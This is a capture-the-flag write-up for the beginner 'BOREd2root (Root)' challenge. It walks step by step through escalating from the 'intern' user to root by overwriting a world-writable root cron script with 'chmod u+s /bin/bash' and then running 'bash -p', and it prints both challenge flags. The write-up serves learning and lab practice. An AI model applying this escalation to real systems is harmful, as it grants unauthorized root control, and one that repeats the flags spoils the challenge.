# BOREd2root (Root) — Writeup

**Category:** Boot2Root
**Difficulty:** Beginner
**Author:** Quack

**Challenge:** [BOREd2root (Root)](https://global.brunnerctf.dk/challenges#BOREd2root%20%28Root%29-135)

> This challenge should be solved after completing **BOREd2root (User)**.

---

# Overview

After completing the User challenge, I had a shell as:

```text
intern
```

The goal of this challenge was to escalate privileges from `intern` to `root`.

The intended path was a vulnerable root cron job executing a **world-writable script**.

---

# 1. Starting Point

I confirmed my current privileges:

```bash
whoami
id
```

Output:

```text
intern
```

and:

```text
uid=1000(intern) gid=1000(intern) groups=1000(intern)
```

The challenge provided a file called:

```text
NEXT-STEPS.txt
```

I read it:

```bash
cat ~/NEXT-STEPS.txt
```

It explained that a cron job was running every minute as root.

---

# 2. Enumerating Cron Jobs

I checked:

```bash
cat /etc/crontab
```

The important entry was:

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root /usr/local/bin/backup-timesheets
```

This means:

```text
Every minute
      ↓
root
      ↓
/usr/local/bin/backup-timesheets
```

The next step was checking the permissions of this script.

---

# 3. Finding the Writable Root Script

I ran:

```bash
ls -l /usr/local/bin/backup-timesheets
```

Output:

```text
-rwxrwxrwx. 1 root root 79 Aug 19 14:42 /usr/local/bin/backup-timesheets
```

The important part is:

```text
rwxrwxrwx
```

The script was writable by everyone.

This means the low-privileged `intern` user could modify a script that would later be executed by `root`.

This creates a classic **cron privilege-escalation vulnerability**.

---

# 4. Modifying the Cron Script

I replaced the script with:

```bash
echo '#!/bin/sh' > /usr/local/bin/backup-timesheets
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup-timesheets
```

I verified the contents:

```bash
cat /usr/local/bin/backup-timesheets
```

Output:

```text
#!/bin/sh
chmod u+s /bin/bash
```

---

# 5. Waiting for Cron

Since the cron job runs every minute, I waited for it to execute.

Then checked:

```bash
ls -l /bin/bash
```

The output became:

```text
-rwsr-xr-x. 1 root root 1298416 May  9 11:07 /bin/bash
```

The important change was:

```text
-rwxr-xr-x
```

becoming:

```text
-rwsr-xr-x
```

The `s` indicates that the **SUID bit** is set.

Because `/bin/bash` is owned by root, Bash can now be executed with root's effective privileges.

---

# 6. Getting a Root Shell

I executed:

```bash
/bin/bash -p
```

The `-p` option preserves the privileged effective UID.

I verified my privileges:

```bash
id
```

Output:

```text
uid=1000(intern) gid=1000(intern) euid=0(root) groups=1000(intern)
```

The important part:

```text
euid=0(root)
```

Then:

```bash
whoami
```

returned:

```text
root
```

I had successfully obtained root access.

---

# 7. Root Flag

Finally:

```bash
cat /root/root.txt
```

Root flag:

```text
brunner{d0wn_d0wn_d0wn_th3_r00t1t_h013}
```

---

# Attack Chain

```text
intern shell
      ↓
/etc/crontab
      ↓
Root cron executes backup-timesheets
      ↓
backup-timesheets is world-writable
      ↓
Modify the script
      ↓
chmod u+s /bin/bash
      ↓
SUID Bash
      ↓
/bin/bash -p
      ↓
euid=0(root)
      ↓
Root Flag
```

---

# Vulnerability Analysis

## World-Writable Root Cron Script

The main vulnerability was:

```text
-rwxrwxrwx root root /usr/local/bin/backup-timesheets
```

while `/etc/crontab` executed it as:

```text
root
```

every minute.

This allowed a low-privileged user to modify code that would subsequently execute with root privileges.

### Impact

An attacker could execute arbitrary commands as root.

---

# Flags

### User Flag

```text
brunner{n0w_1_4m_4_c3rt1f13d_m0l3!}
```

### Root Flag

```text
brunner{d0wn_d0wn_d0wn_th3_r00t1t_h013}
```

---

# Conclusion

BOREd2root (Root) demonstrates a classic Linux privilege-escalation scenario.

The vulnerable chain was:

**World-Writable Script → Root Cron → SUID Bash → Root Shell**

Combined with the previous User challenge, the complete attack path was:

```text
eval()
   ↓
Python RCE
   ↓
Reverse Shell
   ↓
Bore
   ↓
intern
   ↓
Root Cron Abuse
   ↓
SUID Bash
   ↓
root
```

**BOREd2root (Root) — Pwned. 👑🔥**
